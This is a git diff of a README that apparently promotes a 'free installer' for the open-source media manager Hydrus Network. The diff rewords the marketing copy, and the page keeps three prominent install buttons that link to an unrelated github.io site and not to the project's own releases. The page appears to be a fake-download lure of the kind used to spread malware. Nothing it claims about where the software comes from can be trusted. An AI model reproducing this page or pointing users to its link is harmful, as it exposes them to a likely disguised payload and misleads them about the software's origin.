@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Media+Manager-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Media+Management-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Hydrus Network Free Installer** — Hydrus Network is a free, open-source personal media management application for organizing large collections of images, video, and other files with a tag-based system. Works without internet access, no account required. Full offline installation.
+**💻 Hydrus Network Free Installer** — Hydrus Network is a free, open-source personal media management application for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Hydrus Network](https://img.shields.io/badge/⬇_Install_Hydrus%20Network-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Hydrus Network](https://img.shields.io/badge/⬇_Install_Hydrus+Network-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Hydrus Network
 
-Hydrus Network is a free, open-source personal media management application for organizing large collections of images, video, and other files with a tag-based system. Popular in online communities for managing downloaded media archives.
+Hydrus Network is a free, open-source personal media management application for Windows, macOS, and Linux. Manage large collections of images, videos, and files with a powerful tagging system, automatic duplicate detection, URL import, and a local network server for multi-device access. Popular in communities that need sophisticated local media archiving without cloud dependency.
 
 ---
 
 ## ❌ Problem: Hydrus Network is hard to access
 
-- **Complex Interface** — Steep learning curve; not intuitive for new users
-- **Technical Setup** — Initial configuration and tag import requires significant effort
-- **Community-Specific** — Particularly popular for managing booru-style tagged image archives
-- **Resource Usage** — Managing very large libraries requires substantial disk space and RAM
+- **Steep Learning Curve** — Hydrus has a unique tagging philosophy requiring significant investment to learn
+- **Interface Complexity** — Feature-dense UI overwhelming for casual users
+- **Setup Investment** — Requires configuration before productive use
+- **Niche Community** — Support and documentation primarily from community forums
 
 ---
 
@@ -81,7 +81,7 @@ Hydrus Network is a free, open-source personal media management application for 
 
 <div align="center">
 
-[![⬇ Install Hydrus Network](https://img.shields.io/badge/⬇_Install_Hydrus%20Network-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Hydrus Network](https://img.shields.io/badge/⬇_Install_Hydrus+Network-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Hydrus Network is a free, open-source personal media management application for 
 
 ---
 
-**Hydrus Network Free Installer** — Hydrus Network is a free, open-source personal media management application for organizing large collections of images, video, and other files with a tag-based system. Install without internet connection today!
+**Hydrus Network Free Installer** — Hydrus Network is a free, open-source personal media management application for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Hydrus Network](https://img.shields.io/badge/⬇_Install_Hydrus%20Network-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Hydrus Network](https://img.shields.io/badge/⬇_Install_Hydrus+Network-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
